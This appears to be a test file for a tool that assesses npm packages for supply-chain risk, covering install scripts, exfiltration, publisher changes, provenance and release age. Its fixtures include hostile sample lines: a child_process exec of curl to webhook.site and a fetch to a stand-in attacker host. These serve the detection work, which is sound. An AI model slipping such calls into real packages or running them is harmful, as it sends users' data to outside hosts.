import assert from 'node:assert/strict'
import { test } from 'node:test'
import publishers from '@preventive/publishers/npm.js'
import { DEFAULT_MINIMUM_RELEASE_AGE, NpmRiskError, assessNpm } from '../risk/index.js'
import { npmVersionManifest } from '../risk/npm/manifest.js'
import { npmTarballVersion } from '../risk/npm/tarball.js'
import { npmFilesDiff } from '../risk/npm/diff.js'
import { REGISTRY, packageOf } from './_managed-npm.js'

const DAY = 24 * 60 * 60_000
const NOW = Date.parse('2026-10-12T12:00:00Z')
const ago = days => new Date(NOW - days * DAY).toISOString()

// npm's registry and downloads API for `packages`, each `{ name, versions:
// [{ doc, tgz, published }], created? }`, and `downloads` by name; each URL
// asked, in order.
function npm(t, packages, downloads = {}) {
  const asked = []
  t.mock.method(globalThis, 'fetch', input => Promise.resolve(answer(String(input))))
  const answer = url => {
    asked.push(url)
    if (url.startsWith('https://api.npmjs.org/downloads/range/')) {
      const name = decodeURIComponent(url.split('/').at(-1))
      return downloads[name] ? Response.json(downloads[name]) : Response.json({ error: `package ${name} not found` }, { status: 404 })
    }
    for (const { name, versions, created } of packages) {
      if (url === `${REGISTRY}/${name}`) {
        return Response.json({ name, versions: Object.fromEntries(versions.map(({ doc }) => [doc.version, doc])),
          time: { created: created ?? versions[0].published, modified: versions.at(-1).published, ...Object.fromEntries(versions.map(({ doc, published }) => [doc.version, published])) } })
      }
      for (const { doc, tgz } of versions) if (url === doc.dist.tarball) return new Response(tgz)
    }
    return Response.json({ error: 'Not found' }, { status: 404 })
  }
  return asked
}

// A cache kept in a Map, noting each type written.
function store() {
  const kept = new Map(), written = new Set()
  return { kept, written, read: (type, key) => Promise.resolve(kept.get(`${type} ${key}`) ?? null), write: (type, key, value) => { written.add(type); kept.set(`${type} ${key}`, value); return Promise.resolve() } }
}

const version = (name, number, files, extra, published) => ({ ...packageOf(name, number, files, extra), published })
const ids = assessment => assessment.findings.map(({ id }) => id)

test('a version alone: everything of it new, its files stamped, too new under the minimum release age', async t => {
  const files = { 'package.json': '{"name":"lone"}', 'index.js': 'require("child_process").exec("curl https://webhook.site/x")\n', 'README.md': '# lone' }
  npm(t, [{ name: 'lone', versions: [version('lone', '1.0.0', files, { dependencies: {}, scripts: { postinstall: 'node setup.js' } }, ago(1))] }])
  const assessment = await assessNpm('lone', '1.0.0', { now: NOW, downloads: false })
  assert.equal(assessment.published, ago(1))
  assert.deepEqual(ids(assessment), ['install-scripts', 'runs-code', 'exfiltration', 'new-hosts', 'too-new'])
  assert.deepEqual(assessment.findings.find(({ id }) => id === 'runs-code'), { id: 'runs-code', severity: 'critical', files: [{ path: 'index.js', added: { 'child-process': [1] } }] })
  assert.deepEqual(assessment.files['index.js'].stamps, [{ name: 'child_process', severity: 'high' }, { name: 'Exfiltration', severity: 'high' }])
  assert.deepEqual(assessment.files['index.js'].exfiltration, { 'webhook-site': [1] })
  assert.deepEqual(assessment.files['README.md'].stamps, [])
  assert.equal(DEFAULT_MINIMUM_RELEASE_AGE, 14 * DAY)
  assert.ok(!ids(await assessNpm('lone', '1.0.0', { now: NOW, downloads: false, minimumReleaseAge: 0 })).includes('too-new'), 'none under a minimum of 0, as own scopes take')
  assert.ok(!ids(await assessNpm('lone', '1.0.0', { now: NOW + 14 * DAY, downloads: false })).includes('too-new'), 'none once old enough')
})

test('against the version before: what it adds and changes, its publisher and provenance, and a new dependency\'s package', async t => {
  const known = publishers[0]
  const before = version('axios-like', '1.0.0', { 'package.json': '{}', 'lib/axios.js': 'require("follow-redirects")\n' },
    { dependencies: { 'follow-redirects': '^1.15.6' }, scripts: {}, _npmUser: { name: known } }, ago(30))
  before.doc.dist.attestations = { provenance: { predicateType: 'https://slsa.dev/provenance/v1' } }
  const after = version('axios-like', '1.0.1', { 'package.json': '{}', 'lib/axios.js': 'require("follow-redirects")\n' },
    { dependencies: { 'follow-redirects': '^1.15.6', 'crypto-like': '^4.2.1' }, scripts: {}, _npmUser: { name: 'someone-new' } }, ago(20))
  const dependency = version('crypto-like', '4.2.1', { 'package.json': '{}', 'setup.js': '' }, { scripts: { postinstall: 'node setup.js' } }, ago(20.5))
  npm(t, [{ name: 'axios-like', versions: [before, after] }, { name: 'crypto-like', versions: [dependency] }])
  const assessment = await assessNpm('axios-like', '1.0.1', { oldVersion: '1.0.0', now: NOW })
  assert.deepEqual(ids(assessment), ['publisher', 'provenance-lost', 'unused-deps'])
  assert.deepEqual(assessment.findings[0], { id: 'publisher', was: known, now: 'someone-new', wasKnown: true, nowKnown: false, severity: 'critical' })
  assert.deepEqual(assessment.findings[2].dependencies, [{ name: 'crypto-like', kind: null, range: '^4.2.1' }])
  const [added] = assessment.dependencies.added
  assert.equal(added.name, 'crypto-like')
  assert.deepEqual(added.flags.map(({ check }) => check), ['unimported'])
  assert.deepEqual([added.tier, added.level, added.created, added.gap], [null, 'is-unpopular', ago(20.5), 0.5 * DAY],
    'npm counts none of its downloads: unpopular, first published half a day before the open version')
})

test('what is read is kept by type, and an assessment kept needs no tarball', async t => {
  const files = { 'package.json': '{}', 'index.js': 'eval(x)\n' }
  const asked = npm(t, [{ name: 'kept', versions: [version('kept', '1.0.0', files, { dependencies: {} }, ago(400)), version('kept', '1.1.0', { ...files, 'more.js': 'fetch("https://collector.attacker.dev/x")' }, { dependencies: {} }, ago(300))] }],
    { kept: { start: '2026-08-01', end: '2026-10-11', days: Array.from({ length: 72 }, () => 10) } })
  const cache = store()
  const first = await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW, cache })
  assert.deepEqual(ids(first), ['kept-runs-code', 'new-hosts', 'popularity'], 'eval kept from 1.0.0; a host named anew; few downloads')
  assert.deepEqual(first.findings.at(-1), { id: 'popularity', severity: 'critical', tier: null, level: 'is-unpopular' })
  assert.deepEqual([...cache.written].toSorted(), ['npm/tarballs', 'risk/npm/assessments', 'risk/npm/downloads', 'risk/npm/packages', 'risk/npm/versions'])
  asked.length = 0
  assert.deepEqual(await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW, cache }), first)
  assert.deepEqual(asked, [], 'everything kept: npm isn\'t asked')
  asked.length = 0
  await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW + DAY, cache })
  assert.deepEqual(asked.map(url => url.replace(/range\/[^/]+/u, 'range/…')), [`${REGISTRY}/kept`, 'https://api.npmjs.org/downloads/range/…/kept'],
    'a day on, its deprecations asked again, as they are after an hour, and its downloads, another day\'s; no tarball')
})

test('npm having no such package or version is said so', async t => {
  npm(t, [{ name: 'there', versions: [version('there', '1.0.0', { 'package.json': '{}' }, {}, ago(30))] }])
  await assert.rejects(assessNpm('there', '9.9.9', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'version-not-found')
  await assert.rejects(assessNpm('missing', '1.0.0', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'package-not-found')
})

test('a tarball read as npm installs it, and two versions\' files paired as Compare pairs them', async () => {
  const { tgz } = packageOf('read', '1.0.0', { 'package.json': '{}', 'b.js': 'b', 'a/c.js': 'c', 'bin/tool': '\0\u0001' })
  const read = await npmTarballVersion(tgz)
  assert.deepEqual(read.json, { version: 3, sources: ['a/c.js', 'b.js', 'bin/tool', 'package.json'], sourcesContent: ['c', 'b', null, '{}'] }, 'sorted; one with a NUL no text')
  assert.equal(read.fileSizes.get('bin/tool'), 2)
  const side = files => ({ kind: 'sourcemap', json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
  const text = 'module.exports = function long() { return 42 }\n'.repeat(20)
  assert.deepEqual(npmFilesDiff(side({ 'old.js': text, 'same.js': 'x', 'edit.js': '1' }), side({ 'new.js': text, 'same.js': 'x', 'edit.js': '2', 'add.js': 'y' })),
    { onlyOther: [{ path: 'add.js' }], changed: [{ path: 'edit.js', modified: true }, { path: 'new.js', basePath: 'old.js', renamedFrom: 'old.js', modified: false }] })
})

test('a version document read for what risk reads of it', () => {
  const [known] = publishers
  assert.deepEqual(npmVersionManifest({ _npmUser: { name: known, email: 'x@example.com' }, deprecated: 'use another', scripts: { prepare: 'tsc', postinstall: 'node x.js' },
    dependencies: { a: '1' }, devDependencies: { b: '1' }, dist: { attestations: { provenance: {} } } }),
  { deprecated: 'use another', publisher: known, knownAccounts: [known], dependencies: { a: '1' }, provenance: true, installScripts: { postinstall: 'node x.js' } })
  assert.deepEqual(npmVersionManifest({ _npmUser: { name: 'GitHub Actions', trustedPublisher: { id: 'github' } } }), { trustedPublisher: 'GitHub Actions' })
})
